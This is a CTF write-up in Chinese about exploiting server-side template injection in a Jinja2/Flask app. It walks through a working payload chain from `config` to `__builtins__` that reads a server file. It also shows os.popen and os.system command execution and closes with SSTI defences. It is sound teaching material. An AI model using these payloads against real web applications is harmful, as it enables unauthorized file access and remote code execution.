# CTF-03：SSTI 与 Jinja2 模板注入

> 第三道题。server-side template injection。
> 关联：上一题 ← [[CTF-02_DeveloperHeader绕过登录.md]] | 下一题 → [[CTF-04_HeapDump泄露与内存取证.md]]
> 出题人做了个网站让你 announce 任何东西，你输入的内容被直接拼进了模板。

---

## 题目

输入框提交内容，网站把你的输入渲染到页面上。

输入 `{{ 7*7 }}`，返回 `49`。确认是 SSTI。

---

## 解题过程

### Step 1：探测引擎

`{{ 7*7 }}` → 49，判定为 Jinja2（Flask 默认模板引擎）。

### Step 2：找入口

`{{ config }}` 能正常输出配置信息，说明从 `config` 对象入手是可行的。

### Step 3：向上爬

```
{{ config.__class__ }}
```

`config` 是一个对象，`.__class__` 拿到它的类。Python 里万物皆对象，每个对象都有 `.__class__`。

```
{{ config.__class__.__init__ }}
```

每个类都有 `.__init__` 构造函数，构造函数也是函数对象。

```
{{ config.__class__.__init__.__globals__ }}
```

每个函数都有 `.__globals__`，指向它所属模块的全部全局变量。

这就拿到了整个 werkzeug/Flask 运行时的所有全局变量——包括 `__builtins__`、`os` 等。

### Step 4：拿 `__builtins__`

```
{{ config.__class__.__init__.__globals__['__builtins__'] }}
```

`__builtins__` 是 Python 内置函数的集合，里面有 `open`、`eval`、`exec`、`__import__` 等。

### Step 5：读 flag

```
{{ config.__class__.__init__.__globals__['__builtins__']['open']('flag').read() }}
```

先用 `ls -la` 确认了当前目录有 `flag` 这个文件（无后缀），再用 `open('flag').read()` 读出内容。

---

## 原理：为什么这条路走得通

### 1. Python 对象模型

```
config                 → 一个 Flask 配置对象
.__class__             → 它的类（Config 类）
.__init__              → 这个类的构造函数
.__globals__           → 构造函数所在模块的全部全局变量
['__builtins__']       → Python 内置函数字典
['open']               → 文件读取函数
```

关键：**Python 里一切皆对象。对象有类，类有函数，函数有全局变量。从任何一个对象出发，都能走到 Python 的根。**

链条本质是：

```
任意对象 → 它的类 → 所有类的祖先(object) → 所有子类 → 能执行命令的类
```

或者更短的：

```
任意对象 → 它的类 → 构造函数 → 构造函数的全局变量 → 内置函数
```

### 2. `__builtins__` 是什么

`__builtins__` 是 Python 内置函数的集合。你用过的所有不需要 import 就能用的函数都在这里：

| 函数 | 作用 |
|------|------|
| `open()` | 读/写文件 |
| `eval()` | 执行 Python 表达式 |
| `exec()` | 执行 Python 代码 |
| `__import__()` | 动态导入模块（如 `os`） |

SSTI 拿到 `__builtins__`，就等于拿到了 Python 的全部能力。

### 3. `os` 是什么

`os` 是 Python 的操作系统接口模块。通过它可以直接执行系统命令：

```python
os.popen('cat flag').read()
os.system('whoami')
```

但拿到 `__builtins__` 后其实不需要 `os`——`open()` 能直接读文件，`eval()` 和 `exec()` 能做更多事。

### 4. RCE 和「拿 shell」

| 概念 | 说明 |
|------|------|
| **RCE** | Remote Code Execution，远程代码执行。攻击者能在服务器上跑任意代码。 |
| **拿 shell** | 拿到服务器的命令行交互。比 RCE 更进一步，能持续操作。 |

SSTI 里的 RCE 一般指通过模板注入执行了系统命令（如 `cat flag`）。如果题目允许反弹 shell，就能更进一步「拿 shell」。

---

## 防御：业界怎么防 SSTI

| 防御方式 | 说明 |
|---------|------|
| **不用用户输入拼模板** | 最常见的方式。模板写死，用户输入只作为变量传入，不拼接模板语法。 |
| **沙箱渲染** | Jinja2 的沙箱模式可以限制访问 `__class__`、`__globals__` 等属性。但沙箱经常被绕过。 |
| **白名单函数** | 只允许用户使用有限的函数，不开放任意表达式。 |
| **上下文转义** | 对输出做 HTML 转义，防止恶意模板被解析。 |
| **最小权限** | 应用容器化，即使被 RCE 也拿不到核心数据。 |

最有效的防御是第一行：**不要把用户输入作为模板代码渲染。**

---
